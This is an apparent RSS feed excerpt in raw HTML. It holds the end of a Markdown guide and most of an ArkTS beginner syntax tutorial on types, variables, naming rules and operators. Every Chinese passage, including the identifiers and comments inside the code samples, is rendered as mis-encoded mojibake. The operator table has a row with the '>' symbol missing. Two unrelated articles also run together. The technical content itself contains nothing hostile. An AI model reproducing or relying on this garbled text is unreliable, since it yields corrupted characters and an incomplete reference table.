<p>å¦‚éœ€çœŸæ­£çš„ç»Ÿè®¡å›¾ï¼ˆæŠ˜çº¿/æŸ±çŠ¶/é¥¼å›¾ï¼‰ï¼Œå¯ä»¥ï¼š</p>
<ul>
<li>åœ¨æ–‡æ¡£ä¸­è´´è¡¨æ ¼ + åˆ†ææ–‡å­—ï¼›</li>
<li>æˆ–è€…é…åˆå¤–éƒ¨å·¥å…·ç”Ÿæˆå›¾ç‰‡åæ’å…¥ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-24">17. åœ¨æœ¬ä»“åº“ä¸­çš„ä½¿ç”¨å»ºè®®</h2>
<p>ç»“åˆå½“å‰ä»“åº“æ€§è´¨ï¼ˆè®°å½•é¡¹ç›®å¼€å‘ç»éªŒã€ç¬”è®°ç­‰ï¼‰ï¼Œå»ºè®®ï¼š</p>
<ul>
<li>æ–°å»ºä¸“é¢˜æ–‡æ¡£æ—¶ï¼Œç»Ÿä¸€ä½¿ç”¨ <code>xxxç¬”è®°.md</code>ã€<code>xxxæ€»ç»“.md</code> æˆ–ç±»ä¼¼å‘½åã€‚</li>
<li>æ¯ç¯‡æ–‡æ¡£ä¸­ï¼š
<ul>
<li>å¼€å¤´ä½¿ç”¨ <code>##</code> æ ‡é¢˜ä½œä¸ºæ–‡æ¡£åã€‚</li>
<li>ä½¿ç”¨ <code>###</code> ä½œä¸ºç¬¬äºŒå±‚çº§ï¼ˆå¦‚â€œèƒŒæ™¯â€ã€â€œæ­¥éª¤â€ã€â€œé—®é¢˜è®°å½•â€ï¼‰ã€‚</li>
<li>ä½¿ç”¨åˆ—è¡¨å’Œä»£ç å—è¯¦ç»†è®°å½•æ“ä½œæ­¥éª¤ä¸å‘½ä»¤ã€‚</li>
</ul>
</li>
<li>è‹¥æ–‡æ¡£è¾ƒé•¿ï¼Œå¯åœ¨å¼€å¤´æ‰‹å·¥å†™ä¸€ä¸ªç®€å•ç›®å½•ï¼š</li>
</ul>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section">## ç›®å½•</span>
<span class="hljs-bullet">-</span> [<span class="hljs-string">èƒŒæ™¯</span>](<span class="hljs-link">#èƒŒæ™¯</span>)
<span class="hljs-bullet">-</span> [<span class="hljs-string">æ“ä½œæ­¥éª¤</span>](<span class="hljs-link">#æ“ä½œæ­¥éª¤</span>)
<span class="hljs-bullet">-</span> [<span class="hljs-string">é—®é¢˜æ’æŸ¥</span>](<span class="hljs-link">#é—®é¢˜æ’æŸ¥</span>)
</code></pre>
<hr/>
<p>ä»¥ä¸Šå°±æ˜¯ä¸€ä»½æ¯”è¾ƒå…¨é¢çš„ Markdown è¯­æ³•ä¸ä½¿ç”¨æŒ‡å—ï¼Œåç»­å†™æ–‡æ¡£é‡åˆ°ä¸ç†Ÿæ‚‰çš„æ ¼å¼æ—¶ï¼Œå¯ä»¥éšæ—¶å›æ¥çœ‹ç¤ºä¾‹ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ArkTSåŸºç¡€è¯­æ³• | ï¼ˆ1ï¼‰åŸºæœ¬çŸ¥è¯†]]></title>    <link>https://juejin.cn/post/7604175912482029574</link>    <guid>https://juejin.cn/post/7604175912482029574</guid>    <pubDate>2026-02-09T09:07:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7604175912482029574" data-draft-id="7604142616474927110" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ArkTSåŸºç¡€è¯­æ³• | ï¼ˆ1ï¼‰åŸºæœ¬çŸ¥è¯†"/> <meta itemprop="keywords" content="ArkTS"/> <meta itemprop="datePublished" content="2026-02-09T09:07:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Lee_xiaoming"/> <meta itemprop="url" content="https://juejin.cn/user/3775072660106464"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ArkTSåŸºç¡€è¯­æ³• | ï¼ˆ1ï¼‰åŸºæœ¬çŸ¥è¯†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3775072660106464/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Lee_xiaoming
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-09T09:07:30.000Z" title="Mon Feb 09 2026 09:07:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ArkTSåŸºç¡€è¯­æ³• | ï¼ˆ1ï¼‰åŸºæœ¬çŸ¥è¯†</h2>
<p>åœ¨å­¦ä¹ HarmonyOSå¼€å‘çš„æ ¸å¿ƒè¯­è¨€ArkTSæ—¶ï¼Œæ•´ç†äº†ä¸€ä»½åŸºç¡€è¯­æ³•ç¬”è®°ï¼Œæ–¹ä¾¿æ—¥åå›é¡¾ã€‚
<br/></p>
<h3 data-id="heading-1">ä¸€ã€æ—¥å¿—æ‰“å°</h3>
<p>ArkTSä¸­æœ€å¸¸ç”¨çš„è°ƒè¯•æ–¹å¼ä¸ºæ—¥å¿—æ‰“å°ï¼Œä½¿ç”¨<code>console.log</code>æ–¹æ³•å³å¯å®ç°ï¼Œå¤šä¸ªæ‰“å°å­—æ®µç›´æ¥ç”¨é€—å·åˆ†éš”ã€‚</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ‰“å°æ—¥å¿—'</span>, <span class="hljs-string">'å­—æ®µ1'</span>, <span class="hljs-string">'å­—æ®µ2'</span>);
</code></pre>
<br/>
<h3 data-id="heading-2">äºŒã€æ•°æ®ç±»å‹</h3>
<p>ArkTSæ˜¯<strong>å¼ºç±»å‹è¯­è¨€</strong>ï¼Œå˜é‡å£°æ˜æ—¶éœ€è¦æ˜¾å¼æŒ‡å®šç±»å‹ï¼Œæ ¸å¿ƒåŸºç¡€ç±»å‹å¦‚ä¸‹ï¼Œæ¶µç›–åŸºæœ¬ç±»å‹ã€å¼•ç”¨ç±»å‹ã€å¤åˆç±»å‹ç­‰ã€‚</p>
<h5 data-id="heading-3">1. å­—ç¬¦ä¸²ç±»å‹ï¼ˆstringï¼‰</h5>
<ul>
<li>ä»£è¡¨å­—ç¬¦åºåˆ—ï¼Œå¯ä½¿ç”¨è½¬ä¹‰å­—ç¬¦è¡¨ç¤ºç‰¹æ®Šå­—ç¬¦ã€‚</li>
<li>å†…å®¹å¿…é¡»ç”¨å•å¼•å·æˆ–åŒå¼•å·åŒ…è£¹</li>
</ul>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">let</span> <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">'ArkTSå­¦ä¹ '</span>;   <span class="hljs-comment">// ç¤ºä¾‹</span>
</code></pre>
<h5 data-id="heading-4">2. æ•°å­—ç±»å‹ï¼ˆnumberï¼‰</h5>
<ul>
<li>æ— éœ€åŒºåˆ†æ•´æ•°å’Œæµ®ç‚¹æ•°ï¼Œå¯ç»Ÿä¸€è¡¨ç¤ºæ•´æ•°ã€å°æ•°ã€‚</li>
</ul>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">let</span> <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">25</span>;
<span class="hljs-keyword">let</span> <span class="hljs-attr">price</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">99.9</span>;
</code></pre>
<h5 data-id="heading-5">3. å¸ƒå°”ç±»å‹ï¼ˆbooleanï¼‰</h5>
<ul>
<li>ä»…åŒ…å«<code>true</code>ï¼ˆçœŸï¼‰å’Œ<code>false</code>ï¼ˆå‡ï¼‰ä¸¤ä¸ªé€»è¾‘å€¼</li>
</ul>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">let</span> <span class="hljs-attr">isFinish</span>: <span class="hljs-built_in">boolean</span> = <span class="hljs-literal">true</span>;
</code></pre>
<h5 data-id="heading-6">4. void ç±»å‹</h5>
<ul>
<li>ç”¨äºæŒ‡å®šå‡½æ•°<strong>æ²¡æœ‰è¿”å›å€¼</strong></li>
<li>å±äºå¼•ç”¨ç±»å‹ï¼Œå¯ç”¨äºæ³›å‹ç±»å‹å‚æ•°ã€‚</li>
</ul>
<h5 data-id="heading-7">5. Object / object ç±»å‹</h5>
<ul>
<li><code>Object</code>ï¼šæ‰€æœ‰å¼•ç”¨ç±»å‹çš„åŸºç±»å‹ï¼Œä»»ä½•å€¼ï¼ˆåŒ…æ‹¬åŸºæœ¬ç±»å‹ï¼‰éƒ½å¯èµ‹å€¼ç»™å®ƒï¼ŒåŸºæœ¬ç±»å‹å€¼ä¼šè¢«è‡ªåŠ¨è£…ç®±ã€‚</li>
<li><code>object</code>ï¼šè¡¨ç¤ºé™¤åŸºæœ¬ç±»å‹å¤–çš„æ‰€æœ‰ç±»å‹ã€‚</li>
</ul>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">let</span> <span class="hljs-attr">o1</span>: <span class="hljs-title class_">Object</span> = <span class="hljs-string">'Alice'</span>;
<span class="hljs-keyword">let</span> <span class="hljs-attr">o2</span>: <span class="hljs-title class_">Object</span> = [<span class="hljs-string">'a'</span>, <span class="hljs-string">'b'</span>];
<span class="hljs-keyword">let</span> <span class="hljs-attr">o3</span>: <span class="hljs-title class_">Object</span> = <span class="hljs-number">1</span>;
<span class="hljs-keyword">let</span> <span class="hljs-attr">o4</span>: <span class="hljs-built_in">object</span> = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
</code></pre>
<h5 data-id="heading-8">6. æ•°ç»„ç±»å‹ï¼ˆarrayï¼‰</h5>
<ul>
<li>ç”¨äºå­˜å‚¨<strong>å¤šä¸ªåŒç±»å‹æ•°æ®</strong>ï¼Œå£°æ˜çš„ç±»å‹éœ€ä¸å­˜å‚¨æ•°æ®ç±»å‹ä¸€è‡´ï¼Œå¦åˆ™æŠ¥é”™ã€‚</li>
<li>å£°æ˜æ ¼å¼ï¼š<code>let æ•°ç»„å: ç±»å‹[] = [æ•°æ®1, æ•°æ®2, ...]</code></li>
<li>æ•°ç»„ç´¢å¼•ä»0å¼€å§‹ï¼Œé€šè¿‡<code>æ•°ç»„å[ç´¢å¼•]</code>å–å€¼ã€‚</li>
</ul>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">let</span> <span class="hljs-attr">names</span>: <span class="hljs-built_in">string</span>[] = [<span class="hljs-string">'å°é¸£'</span>, <span class="hljs-string">'å°ä½•'</span>, <span class="hljs-string">'å°æ¨'</span>];
<span class="hljs-keyword">let</span> <span class="hljs-attr">scores</span>: <span class="hljs-built_in">number</span>[] = [<span class="hljs-number">90</span>, <span class="hljs-number">85</span>, <span class="hljs-number">95</span>];

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(names[<span class="hljs-number">0</span>]);   <span class="hljs-comment">// å–å€¼ è¾“å‡ºï¼šå°é¸£</span>
</code></pre>
<h5 data-id="heading-9">7. è”åˆç±»å‹ï¼ˆUnionï¼‰</h5>
<p>è®©å˜é‡çš„ç±»å‹æˆ–å–å€¼æ›´çµæ´»ï¼Œåˆ†ä¸º<strong>å¤šç±»å‹è”åˆ</strong>å’Œ<strong>å¤šå€¼è”åˆ</strong>ä¸¤ç§ã€‚</p>
<p>å¤šç±»å‹è”åˆï¼šå˜é‡å¯å­˜å‚¨è”åˆç±»å‹ä¸­çš„ä»»æ„ä¸€ç§ç±»å‹æ•°æ®</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">let</span> å˜é‡å: ç±»å‹<span class="hljs-number">1</span> | ç±»å‹<span class="hljs-number">2</span> | ç±»å‹<span class="hljs-number">3</span> = å€¼;   <span class="hljs-comment">// æ ¼å¼</span>

<span class="hljs-comment">// ç¤ºä¾‹</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">data</span>: <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span> | <span class="hljs-built_in">boolean</span>;
data = <span class="hljs-string">'å­—ç¬¦ä¸²'</span>;   <span class="hljs-comment">// åˆæ³•</span>
data = <span class="hljs-number">123</span>;       <span class="hljs-comment">// åˆæ³•</span>
data = <span class="hljs-literal">true</span>;      <span class="hljs-comment">// åˆæ³•</span>
data = [];        <span class="hljs-comment">// ä¸åˆæ³•ï¼šä¸åœ¨è”åˆç±»å‹èŒƒå›´å†…</span>
</code></pre>
<br/>
å¤šå€¼è”åˆï¼šçº¦æŸå˜é‡åªèƒ½å–æŒ‡å®šçš„å‡ ä¸ªå€¼ï¼ˆç±»ä¼¼ç®€å•çš„å–å€¼æšä¸¾ï¼‰ 
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">let</span> å˜é‡å: å€¼<span class="hljs-number">1</span> | å€¼<span class="hljs-number">2</span> | å€¼<span class="hljs-number">3</span> = å€¼;   <span class="hljs-comment">// æ ¼å¼</span>

<span class="hljs-comment">// ç¤ºä¾‹</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">status</span>: <span class="hljs-string">'æˆåŠŸ'</span> | <span class="hljs-string">'å¤±è´¥'</span> | <span class="hljs-string">'å¤„ç†ä¸­'</span>;
status = <span class="hljs-string">'æˆåŠŸ'</span>;   <span class="hljs-comment">// åˆæ³•</span>
status = <span class="hljs-string">'å¼‚å¸¸'</span>;   <span class="hljs-comment">// ä¸åˆæ³•ï¼šä¸åœ¨æŒ‡å®šå€¼èŒƒå›´å†…</span>
</code></pre>
<h5 data-id="heading-10">8. æšä¸¾ç±»å‹ï¼ˆenumï¼‰</h5>
<ul>
<li>æœ‰æè¿°æ€§çš„å¸¸é‡åˆ—è¡¨ï¼Œçº¦æŸå˜é‡åªèƒ½åœ¨æŒ‡å®šèŒƒå›´å†…å–å€¼ã€‚</li>
<li>å¤æ‚åœºæ™¯ä¸‹ï¼Œå¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§è¿œé«˜äºè”åˆç±»å‹ã€‚</li>
</ul>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-comment">// å£°æ˜æšä¸¾</span>
<span class="hljs-keyword">enum</span> æšä¸¾å {
   å¸¸é‡<span class="hljs-number">1</span> = å€¼,
   å¸¸é‡<span class="hljs-number">2</span> = å€¼,
   ......
}

<span class="hljs-keyword">let</span> å˜é‡å : æšä¸¾å = æšä¸¾å.å¸¸é‡å;   <span class="hljs-comment">// ä½¿ç”¨æšä¸¾ç±»å‹çº¦æŸå˜é‡</span>
</code></pre>
<h5 data-id="heading-11">9. Aliasesç±»å‹</h5>
<p>ä¸ºåŒ¿åç±»å‹ï¼ˆå¦‚æ•°ç»„ã€å‡½æ•°ã€å¯¹è±¡å­—é¢é‡ã€è”åˆç±»å‹ï¼‰æä¾›åç§°ï¼Œæˆ–ä¸ºå·²å®šä¹‰çš„ç±»å‹æä¾›æ›¿ä»£åç§°ï¼Œæå‡ä»£ç å¯è¯»æ€§ã€‚
<br/></p>
<h3 data-id="heading-12">ä¸‰ã€å˜é‡ä¸å¸¸é‡</h3>
<p>ArkTSä¸­é€šè¿‡<code>let</code>å£°æ˜å˜é‡ã€<code>const</code>å£°æ˜å¸¸é‡ï¼ŒäºŒè€…å‡éœ€éµå¾ªå¼ºç±»å‹è§„åˆ™ï¼Œå­˜å‚¨å†…å®¹éœ€ä¸å£°æ˜ç±»å‹ä¸€è‡´ã€‚</p>
<h5 data-id="heading-13">1. å˜é‡ï¼ˆå¯å˜æ•°æ®ï¼‰</h5>
<ul>
<li>å…³é”®å­—ï¼š<code>let</code></li>
<li>æ ¼å¼ï¼š<code>let å˜é‡å: ç±»å‹ = å€¼</code>ï¼›</li>
<li>å£°æ˜åå¯ä¿®æ”¹å…¶å€¼ï¼Œç±»å‹å§‹ç»ˆä¿æŒä¸€è‡´ã€‚</li>
</ul>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">let</span> <span class="hljs-attr">title</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">'ArkTSè¯­è¨€'</span>;
<span class="hljs-keyword">let</span> <span class="hljs-attr">num</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">2.7</span>;
title = <span class="hljs-string">'å­¦ä¹ ArkUI'</span>;   <span class="hljs-comment">// åˆæ³• ä¿®æ”¹å˜é‡å€¼</span>
</code></pre>
<h5 data-id="heading-14">2. å¸¸é‡ï¼ˆä¸å¯å˜æ•°æ®ï¼‰</h5>
<ul>
<li>å…³é”®å­—ï¼š<code>const</code></li>
<li>æ ¼å¼ï¼š<code>const å¸¸é‡å: ç±»å‹ = å€¼</code>ï¼›</li>
<li>å£°æ˜æ—¶<strong>å¿…é¡»èµ‹å€¼</strong>ï¼Œèµ‹å€¼åæ— æ³•ä¿®æ”¹ï¼Œä¿®æ”¹ä¼šç›´æ¥æŠ¥é”™ã€‚</li>
<li>é€‚ç”¨åœºæ™¯ï¼šå­˜å‚¨å›ºå®šä¸å˜çš„å€¼ï¼ˆå¦‚åœ†å‘¨ç‡ã€å›ºå®šé…ç½®ï¼‰</li>
</ul>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">const</span> <span class="hljs-attr">PI</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">3.1415926</span>;   <span class="hljs-comment">// å£°æ˜å¸¸é‡</span>
</code></pre>
<h5 data-id="heading-15">3. è‡ªåŠ¨ç±»å‹æ¨æ–­</h5>
<ul>
<li>å¦‚æœå˜é‡/å¸¸é‡å£°æ˜æ—¶åŒ…å«åˆå§‹å€¼ï¼Œå¼€å‘è€…æ— éœ€æ˜¾å¼æŒ‡å®šç±»å‹ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨æ¨æ–­ã€‚</li>
</ul>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">let</span> title = <span class="hljs-string">'ArkTSåŸºç¡€è¯­æ³•'</span>;   <span class="hljs-comment">// è‡ªåŠ¨æ¨æ–­ä¸ºstringç±»å‹</span>
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PI</span> = <span class="hljs-number">3.14</span>;   <span class="hljs-comment">// è‡ªåŠ¨æ¨æ–­ä¸ºnumberç±»å‹</span>
</code></pre>
<br/>
<h3 data-id="heading-16">å››ã€å‘½åè§„åˆ™</h3>
<ol>
<li>åªèƒ½åŒ…å«<strong>æ•°å­—ã€å­—æ¯ã€ä¸‹åˆ’çº¿ï¼ˆ_ï¼‰ã€ç¾å…ƒç¬¦å·ï¼ˆ$ï¼‰</strong>ï¼Œä¸”<strong>ä¸èƒ½ä»¥æ•°å­—å¼€å¤´</strong>ã€‚</li>
<li>ä¸èƒ½ä½¿ç”¨ArkTSçš„<strong>å†…ç½®å…³é”®å­—/ä¿ç•™å­—</strong>ï¼ˆå¦‚letã€constã€functionã€ifç­‰ï¼‰</li>
<li><strong>ä¸¥æ ¼åŒºåˆ†å¤§å°å†™</strong>ï¼ˆå¦‚userNameå’ŒUsernameæ˜¯ä¸¤ä¸ªä¸åŒçš„åç§°ï¼‰
<br/>
</li>
</ol>
<h3 data-id="heading-17">äº”ã€è¿ç®—ç¬¦</h3>
<p>ArkTSæ”¯æŒå¤šç§è¿ç®—ç¬¦ï¼ŒæŒ‰åŠŸèƒ½å¯åˆ†ä¸ºèµ‹å€¼è¿ç®—ç¬¦ã€æ¯”è¾ƒè¿ç®—ç¬¦ã€ç®—æœ¯è¿ç®—ç¬¦ã€ä½è¿ç®—ç¬¦ã€é€»è¾‘è¿ç®—ç¬¦ã€instanceofè¿ç®—ç¬¦ç­‰ã€‚</p>
<h5 data-id="heading-18">1. èµ‹å€¼è¿ç®—ç¬¦</h5>
<ul>
<li>åŸºç¡€èµ‹å€¼ï¼š<code>=</code></li>
<li>å¤åˆèµ‹å€¼ï¼š<code>+=ã€-=ã€*=ã€/=ã€%=ã€&lt;&lt;=ã€&gt;&gt;=ã€&gt;&gt;&gt;=ã€&amp;=ã€|=ã€^=</code>ï¼ˆå¦‚<code>a += b</code> ç­‰ä»·äº <code>a = a + b</code>ï¼‰</li>
</ul>
<h5 data-id="heading-19">2. æ¯”è¾ƒè¿ç®—ç¬¦</h5>
<p>ç”¨äºåˆ¤æ–­ä¸¤ä¸ªæ“ä½œæ•°çš„å…³ç³»ï¼Œè¿”å›å¸ƒå°”å€¼ã€‚</p>








































<table><thead><tr><th>è¿ç®—ç¬¦</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>===</td><td>ä¸¥æ ¼ç›¸ç­‰ï¼šå€¼å’Œç±»å‹éƒ½ç›¸ç­‰æ—¶è¿”å›true</td></tr><tr><td>!==</td><td>ä¸¥æ ¼ä¸ç›¸ç­‰ï¼šå€¼æˆ–ç±»å‹ä¸åŒæ—¶è¿”å›true</td></tr><tr><td>==</td><td>ç›¸ç­‰ï¼šä»…æ¯”è¾ƒå€¼ï¼Œä¼šè‡ªåŠ¨ç±»å‹è½¬æ¢ã€‚</td></tr><tr><td>!=</td><td>ä¸ç›¸ç­‰ï¼šä»…æ¯”è¾ƒå€¼ï¼Œä¼šè‡ªåŠ¨ç±»å‹è½¬æ¢ã€‚</td></tr><tr><td colspan="2">å·¦æ“ä½œæ•°å¤§äºå³æ“ä½œæ•°è¿”å›true</td></tr><tr><td>&gt;=</td><td>å·¦æ“ä½œæ•°å¤§äºç­‰äºå³æ“ä½œæ•°è¿”å›true</td></tr><tr><td>&lt;</td><td>å·¦æ“ä½œæ•°å°äºå³æ“ä½œæ•°è¿”å›true</td></tr><tr><td>&lt;=</td><td>å·¦æ“ä½œæ•°å°äºç­‰äºå³æ“ä½œæ•°è¿”å›true</td></tr></tbody></table>
<h5 data-id="heading-20">3. ç®—æœ¯è¿ç®—ç¬¦</h5>
<ul>
<li>ä¸€å…ƒè¿ç®—ç¬¦ï¼š<code>-ã€+ã€--ã€++</code></li>
<li>äºŒå…ƒè¿ç®—ç¬¦ï¼š<code>+ï¼ˆåŠ æ³•ï¼‰ã€-ï¼ˆå‡æ³•ï¼‰ã€*ï¼ˆä¹˜æ³•ï¼‰ã€/ï¼ˆé™¤æ³•ï¼‰ã€%ï¼ˆå–ä½™ï¼‰</code></li>
</ul>
<h5 data-id="heading-21">4. ä½è¿ç®—ç¬¦</h5>
<p>å¯¹æ“ä½œæ•°çš„äºŒè¿›åˆ¶ä½è¿›è¡Œè¿ç®—ï¼Œé€‚ç”¨äºåº•å±‚å¼€å‘åœºæ™¯ã€‚</p>

































